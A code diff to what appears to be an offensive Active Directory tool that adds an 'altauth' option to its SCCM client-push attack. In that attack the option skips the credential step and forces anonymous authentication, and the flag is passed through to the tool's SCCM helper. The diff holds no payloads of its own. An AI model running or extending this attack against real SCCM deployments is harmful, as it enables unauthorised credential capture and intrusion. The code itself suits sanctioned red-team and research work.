@@ -22,7 +22,7 @@ class HTTP:
     def __init__(self, username=None, password=None, domain=None, target_dom=None,
                     dc_ip=None,ldaps=False, channel_binding=False, signing=False, kerberos=False, no_pass=False, hashes=None,
                     aes=None, debug=False, auto=False, computer_pass=None, computer_hash=None,computer_name=None,
-                    uuid=None, mp=None, sp=False, spcn=None, sppid=None, spanon=False,sleep=None, logs_dir=None):
+                    uuid=None, mp=None, sp=False, spcn=None, sppid=None, spanon=False, altauth=False, sleep=None, logs_dir=None):
         self.username = username
         self.password = password
         self.domain = domain
@@ -48,6 +48,7 @@ class HTTP:
         self.spcn = spcn
         self.sppid = sppid
         self.spanon = spanon
+        self.altauth =altauth
         self.sleep = int(sleep)
         self.targets = []
         self.logs_dir = logs_dir
@@ -91,7 +92,7 @@ class HTTP:
             #TODO: Need some terminal output for actions taken
             #      Need better error handling
             target_mp_url = f"http://{self.mp}"
-            sccmwtf = SCCMTools(target_name="", target_fqdn="", target_sccm=target_mp_url, target_username="", target_password="", sleep=self.sleep, logs_dir=self.logs_dir,sp=self.sp,plid=self.sppid)
+            sccmwtf = SCCMTools(target_name="", target_fqdn="", target_sccm=target_mp_url, target_username="", target_password="", sleep=self.sleep, logs_dir=self.logs_dir,sp=self.sp,altauth=self.altauth, plid=self.sppid)
             with open (f"{self.logs_dir}/{self.uuid}.data", "rb") as f:
                 data = f.read()
             with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
@@ -124,7 +125,6 @@ class HTTP:
     def sccm_push(self):
         logger.info(f"[*] Performing SCCM client push attack")
         key = None
-
         if self.uuid:
             logger.info(f"Detected uuid, trying to reuse alreday created client with uuid: {self.uuid}, \n[!] probably wont work since client needs to be not installed to trigger sccm push... ")
             with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
@@ -133,6 +133,11 @@ class HTTP:
             logger.info(f"Detected provided computer name and credentials, trying to reuse already existing computer to enroll a new client !")
             if not self.computer_pass:
                 self.computer_pass = '0'*32 + ':' + self.computer_hash
+        # Skip credential check/creation if using alt auth endpoint
+        # set Anon auth to true since authentication is not needed for this endpoint
+        elif (self.altauth):
+            self.spanon = True
+            pass
         elif (self.spanon):
             pass
         else:
@@ -162,7 +167,7 @@ class HTTP:
         sccmwtf = SCCMTools(target_name=self.spcn, target_fqdn=target_fqdn, 
                             target_sccm=self.mp,target_username=self.username, 
                             target_password=self.password, sleep=self.sleep, 
-                            logs_dir=self.logs_dir,sp=self.sp,plid=self.sppid)
+                            logs_dir=self.logs_dir,sp=self.sp,altauth=self.altauth, plid=self.sppid)
         try:
             uuid = self.uuid
             if not uuid:
